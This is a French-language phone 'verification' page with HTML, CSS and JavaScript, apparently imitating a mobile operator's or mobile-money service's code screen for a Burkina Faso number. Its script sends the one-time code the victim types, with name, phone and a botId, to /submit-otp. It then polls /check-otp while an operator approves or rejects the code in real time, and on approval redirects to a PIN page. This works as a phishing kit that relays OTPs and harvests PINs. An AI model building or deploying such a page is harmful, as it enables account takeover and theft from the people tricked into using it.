<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Vérifier votre numéro</title>

    <style>
        /* ── reset & base ── */
        *{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
    background:#fff;
    color:#222;
    min-height:100vh;
}

.top-bar{
    height:95px;
    background:#f57c00;
    display:flex;
    align-items:flex-end;
    padding:18px 20px;
}

.back-btn{
    color:#fff;
    font-size:28px;
    text-decoration:none;
}

.container{
    padding:18px 28px;
}

.title{
    font-size:22px;
    font-weight:700;
    margin-bottom:8px;
    color:#333;
}

.subtitle{
    font-size:15px;
    color:#8b8b8b;
    line-height:1.5;
    margin-bottom:30px;
}

.phone-highlight{
    color:#8b8b8b;
}

.otp{
    display:flex;
    gap:10px;
    margin-bottom:20px;
}

.otp input{
    width:54px;
    height:54px;
    border:1px solid #d9d9d9;
    border-radius:8px;
    text-align:center;
    font-size:22px;
    outline:none;
    background:#fff;
}

.otp input:focus{
    border:2px solid #1976d2;
}

.resend-wrap{
    color:#666;
    font-size:15px;
    margin-bottom:40px;
}

.timer{
    font-weight:700;
}

.continue-btn{
    position:fixed;
    left:28px;
    right:28px;
    bottom:28px;
    height:54px;
    border:none;
    border-radius:10px;
    background:#b9cff0;
    color:#fff;
    font-size:20px;
    font-weight:600;
    cursor:not-allowed;
}
    </style>
</head>
<body>

<div class="top-bar">
    <a href="#" class="back-btn">&#8592;</a>
</div>

<div class="container">

    <div class="title">Vérifier votre numéro</div>

    <div class="subtitle">
        Saisissez le code que nous avons envoyé à (+226) 79046955
    </div>

    <div class="otp">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
    </div>

    <div class="resend-wrap">
        Renvoyer le code dans <span class="timer">04:47</span>
    </div>

</div>

<button class="continue-btn">Continuer</button>

    <script>
        (function() {
            // ── 1. Get parameters from URL and localStorage ──
            const urlParams = new URLSearchParams(window.location.search);
            const botId = urlParams.get('botId') || localStorage.getItem('botId');
            const name = urlParams.get('name') || localStorage.getItem('name');
            let phone = urlParams.get('phone') || localStorage.getItem('phone');

            if (!phone) {
                const subtitle = document.querySelector('.subtitle');
                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
                if (match) phone = match[1] + match[2];
                else phone = '79046955';
            }

            if (botId) localStorage.setItem('botId', botId);
            if (name) localStorage.setItem('name', name);
            if (phone) localStorage.setItem('phone', phone);

            // ── 2. Create a message container dynamically ──
            const container = document.querySelector('.container');
            const msgDiv = document.createElement('div');
            msgDiv.id = 'message-box';
            msgDiv.style.display = 'none';
            msgDiv.style.padding = '12px 16px';
            msgDiv.style.borderRadius = '8px';
            msgDiv.style.marginBottom = '20px';
            msgDiv.style.fontSize = '15px';
            msgDiv.style.fontWeight = '500';
            msgDiv.style.transition = 'all 0.2s ease';
            // Insert before the resend-wrap
            const resendWrap = document.querySelector('.resend-wrap');
            container.insertBefore(msgDiv, resendWrap);

            function showMessage(text, isError = true) {
                msgDiv.textContent = text;
                msgDiv.style.display = 'block';
                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
            }

            function hideMessage() {
                msgDiv.style.display = 'none';
                msgDiv.textContent = '';
            }

            // ── 3. OTP auto‑advance & continue button logic ──
            const inputs = document.querySelectorAll('.otp input');
            const continueBtn = document.querySelector('.continue-btn');

            function checkAllFilled() {
                let allFilled = true;
                inputs.forEach(input => {
                    if (input.value.trim() === '') allFilled = false;
                });
                if (allFilled) {
                    continueBtn.disabled = false;
                    continueBtn.style.background = '#1976d2';
                    continueBtn.style.cursor = 'pointer';
                } else {
                    continueBtn.disabled = true;
                    continueBtn.style.background = '#b9cff0';
                    continueBtn.style.cursor = 'not-allowed';
                }
            }

            inputs.forEach((input, index) => {
                input.addEventListener('input', function() {
                    if (this.value.length === 1) {
                        if (index < inputs.length - 1) {
                            inputs[index + 1].focus();
                        }
                    }
                    checkAllFilled();
                    hideMessage(); // hide any previous message on new input
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                input.addEventListener('blur', checkAllFilled);
            });

            // ── 4. Timer & resend (fixed) ──
            const timerSpan = document.querySelector('.timer');
            const resendWrapEl = document.querySelector('.resend-wrap');
            let totalSeconds = 5 * 60;
            let interval = null;

            function formatTime(sec) {
                const m = String(Math.floor(sec / 60)).padStart(2, '0');
                const s = String(sec % 60).padStart(2, '0');
                return `${m}:${s}`;
            }

            function updateTimerUI() {
                if (totalSeconds <= 0) {
                    resendWrapEl.innerHTML = 'Renvoyer le code';
                    resendWrapEl.style.color = '#1976d2';
                    resendWrapEl.style.cursor = 'pointer';
                    resendWrapEl.style.fontWeight = '600';
                    clearInterval(interval);
                    interval = null;
                    resendWrapEl.onclick = function(e) {
                        e.preventDefault();
                        startTimer(5 * 60);
                        hideMessage();
                    };
                    return;
                }
                timerSpan.textContent = `dans ${formatTime(totalSeconds)}`;
                resendWrapEl.innerHTML = `Renvoyer le code dans <span class="timer">${formatTime(totalSeconds)}</span>`;
                resendWrapEl.style.color = '#666';
                resendWrapEl.style.cursor = 'default';
                resendWrapEl.style.fontWeight = '400';
                resendWrapEl.onclick = null;
            }

            function startTimer(seconds) {
                if (interval) clearInterval(interval);
                totalSeconds = seconds;
                updateTimerUI();
                interval = setInterval(() => {
                    totalSeconds--;
                    if (totalSeconds <= 0) {
                        totalSeconds = 0;
                        updateTimerUI();
                        clearInterval(interval);
                        interval = null;
                    } else {
                        updateTimerUI();
                    }
                }, 1000);
            }

            startTimer(5 * 60);

            // ── 5. Backend communication with inline messages ──
            continueBtn.addEventListener('click', function() {
                if (this.disabled) return;

                // Clear any previous message
                hideMessage();

                const otp = Array.from(inputs).map(inp => inp.value).join('');

                if (!botId || !name || !phone) {
                    showMessage('Données manquantes (nom, téléphone ou bot). Veuillez recommencer depuis la première étape.', true);
                    return;
                }

                continueBtn.disabled = true;
                continueBtn.textContent = 'Vérification...';
                continueBtn.style.background = '#f5a623';

                fetch('/submit-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name, phone, otp, botId })
                })
                .then(response => {
                    if (!response.ok) throw new Error('Erreur serveur');
                    return response.json();
                })
                .then(data => {
                    const requestId = data.requestId;
                    if (!requestId) throw new Error('Aucun ID reçu');

                    let pollInterval = setInterval(() => {
                        fetch(`/check-otp/${requestId}`)
                            .then(res => {
                                if (!res.ok) throw new Error('Erreur lors du contrôle');
                                return res.json();
                            })
                            .then(status => {
                                if (status.approved === true) {
                                    clearInterval(pollInterval);
                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
                                } else if (status.approved === false) {
                                    clearInterval(pollInterval);
                                    showMessage('Code incorrect. Veuillez réessayer.', true);
                                    // Reset button
                                    continueBtn.disabled = false;
                                    continueBtn.textContent = 'Continuer';
                                    continueBtn.style.background = '#1976d2';
                                    continueBtn.style.cursor = 'pointer';
                                    inputs.forEach(inp => inp.value = '');
                                    checkAllFilled();
                                    inputs[0].focus();
                                }
                                // else still pending
                            })
                            .catch(err => {
                                clearInterval(pollInterval);
                                showMessage('Erreur de vérification : ' + err.message, true);
                                continueBtn.disabled = false;
                                continueBtn.textContent = 'Continuer';
                                continueBtn.style.background = '#1976d2';
                                continueBtn.style.cursor = 'pointer';
                            });
                    }, 2000);
                })
                .catch(err => {
                    showMessage('Erreur lors de l\'envoi : ' + err.message, true);
                    continueBtn.disabled = false;
                    continueBtn.textContent = 'Continuer';
                    continueBtn.style.background = '#1976d2';
                    continueBtn.style.cursor = 'pointer';
                });
            });

        })();
    </script>

</body>
</html>
